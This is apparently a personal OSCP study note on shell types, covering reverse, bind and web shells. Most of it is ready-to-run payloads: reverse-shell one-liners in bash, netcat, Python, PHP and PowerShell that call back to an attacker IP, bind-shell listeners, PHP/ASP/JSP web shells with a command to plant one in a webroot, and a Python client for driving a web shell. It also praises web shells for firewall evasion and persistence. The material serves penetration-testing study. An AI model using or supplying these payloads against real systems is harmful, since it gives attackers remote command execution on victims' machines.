---
title: Types of Shells
date: 2024-10-23
tags:
  - "#oscp"
  - "#technique"
  - "#exploitation"
techniques:
  - python
  - php
  - powershell
  - web shell
  - jsp
tools:
  - ""
  - ""
machines: ""
difficulty:
  - ""
status:
  - Completed
type: ""
os: ""
categories:
  - ""
exam-priority:
  - medium
time-invested: ""
notes: |
  Key points and takeaways from the exercise.
---

### References
- [Example Tutorial](https://example.com/tutorial)
- [OSCP Exploit Documentation](https://documentation.oscp.org/exploitations)


During the OSCP exam, one of the key tasks is gaining control of compromised systems through various types of shells. These shells allow us to interact with the system for enumeration, further exploitation, and privilege escalation. There are three main types of shells: **Reverse Shell**, **Bind Shell**, and **Web Shell**. Each has a different way of communicating with the attacker’s machine, and knowing when and how to use each type is critical.

### **Shell Types and Communication Methods**

|Shell Type|Communication Method|
|---|---|
|Reverse Shell|The compromised host connects back to the attacker’s machine (initiates the connection).|
|Bind Shell|The attacker connects to the compromised host’s listening shell.|
|Web Shell|The attacker sends commands via web requests (HTTP GET/POST) through a web interface.|

---

### **Reverse Shell**

A **Reverse Shell** connects from the victim’s machine back to your attacking machine, giving you control. This is often the most commonly used method since it avoids the need for the attacker to initiate the connection, which can sometimes be blocked by firewalls.

**Steps for Reverse Shell:**

1. Start a listener (e.g., using `netcat` or `Metasploit`) on your machine.
2. Execute a reverse shell payload on the target system.
3. Once the connection is established, you have control over the system.

**Starting a Netcat Listener (Attacker Machine):**

```bash
nc -lvnp 1234
```

- `l`: Listen for incoming connections.
- `v`: Verbose mode, show connection details.
- `n`: No DNS resolution, faster connection.
- `p 1234`: Listen on port 1234.

**Finding Your IP (Attacker Machine):**

```bash
ip a
```

Look for the `tun0` or `eth0` interface, depending on the network you're on (e.g., VPN or direct).

**Common Reverse Shell Commands:**

- **Bash (Linux)**:
    
    ```bash
    bash -i >& /dev/tcp/10.10.10.10/1234 0>&1
    ```
    
    ```bash
    /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
    ```
    
- **Netcat (Linux)**:
    
    ```bash
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
    ```
    
    ```bash
    nc -e /bin/bash 10.10.10.10 1234
    ```
    
- **Python (Linux)**:
    <pre>```
    python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' ```</pre>
    
- **PHP (Linux)**:
    
    ```bash
    php -r '$sock=fsockopen("10.10.10.10",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
    ```
    
- **PowerShell (Windows)**:
    
    <pre>```powershell
    powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
    ```</pre>
    

**Reverse Shell over HTTPS:** This is useful if HTTP traffic is blocked, but HTTPS is open.

- **Bash (Linux)**:
    
    <pre>```bash
    bash -c "exec 5<>/dev/tcp/10.10.10.10/443;cat <&5 | while read line; do $line 2>&5 >&5; done"
    ```</pre>
    

Once the reverse shell is executed, the listener (Netcat or Metasploit) will show a connection, and you can interact with the compromised system.

---

### **Bind Shell**

A **Bind Shell** sets up a listener on the compromised machine, and the attacker connects to it. Bind shells are less common because firewalls often block inbound connections, but they can be useful in certain scenarios.

**Steps for Bind Shell:**

1. Execute a bind shell payload on the compromised system.
2. Connect to the target machine’s open port with `netcat`.

**Bind Shell Commands:**

- **Bash (Linux)**:
    
    <pre>```bash
    nc -lvnp 1234 -e /bin/bash
    ```</pre>
    
    <pre>```bash
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
    ```</pre>
    
- **Python (Linux)**:
    
    <pre>```python
    python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",1234));s.listen(1);conn,addr=s.accept();while True: data=conn.recv(1024);if not data: break;p=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE);conn.sendall(p.stdout.read()+p.stderr.read())'
    ```</pre>
    
- **PowerShell (Windows)**:
    
    <pre>```
    powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]::new(1234);$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){$data = (New-Object -TypeName Text.ASCIIEncoding).GetString($buffer,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()```</pre>
    

Once the bind shell command is executed, use `nc` or a browser to connect to the open port on the target machine.

**Connecting to Bind Shell:**

<pre>```bash
nc 10.10.10.1 1234
```</pre>

---

### **Upgrading Shells (Reverse or Bind)**

Often, shells obtained through Netcat or other tools are non-interactive. To make the shell interactive, upgrade it to a proper TTY.

**Steps to Upgrade Shell:**

1. **Use Python to spawn a TTY**:
    
    <pre>```bash
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```</pre>
    
2. **Background the shell** with `Ctrl+Z`, then:
    
    <pre>```bash
    stty raw -echo
    fg
    reset
    export TERM=xterm-256color
    stty rows 67 columns 318
    ```</pre>
    

If Python is not available, alternatives include:

- **Perl TTY upgrade**:
    
    <pre>```perl
    perl -e 'exec "/bin/sh";'
    ```</pre>
    
- **Echoing a new terminal**:
    
    <pre>```bash
    echo os.system('/bin/bash')
    ```</pre>
    

---

### **Web Shell**

A **Web Shell** allows you to execute commands on the target server through a web interface, typically via GET or POST requests. This is useful when exploiting file upload vulnerabilities or injecting into a web directory.

**PHP Web Shell (Linux)**:

<pre>```php
<?php system($_GET['cmd']); ?>
```</pre>

**ASP Web Shell (Windows)**:

<pre>```
<% eval request("cmd") %>
```</pre>

**JSP Web Shell**:

<pre>```
<%= Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```</pre>

**Uploading a Web Shell:**

1. Exploit file upload functionality or remote code execution.
    
2. Place the web shell in the webroot directory (e.g., `/var/www/html/`).
    
    <pre>```bash
    echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
    ```</pre>
    

**Accessing the Web Shell:** You can access it using a browser or with `curl`:

- Browser:
    
    <pre>
    ```<http://10.10.10.10/shell.php?cmd=id>```</pre>
    
- `curl`:
    
    <pre>```bash
    curl <http://10.10.10.10/shell.php?cmd=id>
    
    ```</pre>
    

---

In scenarios where firewalls block traditional reverse or bind shells. By leveraging the existing web traffic and ports (typically `80` or `443`), web shells can bypass restrictions, and persistence is a bonus since they remain accessible after system reboots.

However, as you mentioned, one downside is the lack of interactivity. Since each command must be requested via a new URL (usually through GET or POST requests), it can be slow and tedious. To mitigate this, automation scripts can be used to send commands more efficiently and simulate an interactive shell experience. Here's an example of a simple Python script that can automate this process and provide semi-interactive access to a web shell.

---

### **Automating Web Shell Commands with Python**

The following Python script automates sending commands to a web shell through HTTP requests and prints the output in a semi-interactive manner. This makes using the web shell more manageable from a terminal.

**Python Script for Semi-Interactive Web Shell:**

```
import requests

# Set the URL of the web shell
url = "http://SERVER_IP:PORT/shell.php"

# Infinite loop for continuous command input
while True:
    # Prompt user for command input
    cmd = input("Shell> ")

    # Exit if the user types 'exit'
    if cmd.lower() == "exit":
        break

    # Send the command via GET request
    response = requests.get(url, params={"cmd": cmd})

    # Print the output from the server
    print(response.text)
```


### **How It Works:**

1. **URL Definition**: The script points to the URL where the web shell is hosted.
2. **Command Input**: It continuously prompts the user for input.
3. **Sending Command**: It sends the command as a parameter (`cmd`) via a GET request to the web shell.
4. **Output Display**: The response from the server (command execution result) is displayed in the terminal.
5. **Exit Command**: Typing `exit` breaks the loop and closes the shell.

You can save this script as `web_shell.py` and run it in your terminal:

<pre>
```
python3 web_shell.py
```
</pre>

---

### **Handling Edge Cases**

- **Handling POST Requests**: If the web shell uses POST instead of GET, modify the script to send data in the request body:
    
    <pre>```python
    response = requests.post(url, data={"cmd": cmd})
    ```
    </pre>
    
- **Handling Different Response Formats**: If the response from the server contains HTML or other unnecessary formatting, you can clean it up before printing the output. For example, using BeautifulSoup to strip tags:
    
    <pre>
    ```
    from bs4 import BeautifulSoup
    response = requests.get(url, params={"cmd": cmd})
    soup = BeautifulSoup(response.text, 'html.parser')
    print(soup.get_text())
    ```
    </pre>
    

---

### **Pros and Cons of Using a Web Shell**

### **Pros**:

- **Firewall Evasion**: Since web shells use HTTP or HTTPS, they bypass most firewall rules that block traditional shells.
- **Persistence**: The web shell remains functional even after the target system is rebooted unless the web server or files are changed.
- **No New Ports Opened**: Operates over existing web traffic ports (e.g., 80 or 443), reducing detection chances.

### **Cons**:

- **Lack of Interactivity**: Web shells are not as interactive as reverse or bind shells, requiring multiple requests for each command.
- **Slower Operation**: Each command needs a separate HTTP request, adding overhead.
- **Limited Control**: The range of commands and capabilities can be limited depending on the permissions of the web server user (usually `www-data` on Linux).

---

### **Summary of Key Commands**

|Shell Type|Command (Linux)|Command (Windows)|
|---|---|---|
|Reverse Bash|`bash -i >& /dev/tcp/10.10.10.10/1234 0>&1`||
|Reverse Netcat|`nc -e /bin/bash 10.10.10.10 1234`||
|Reverse PowerShell||`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient..."`|
|Bind Bash|`nc -lvnp 1234 -e /bin/bash`||
|Bind PowerShell||`powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener =...`|
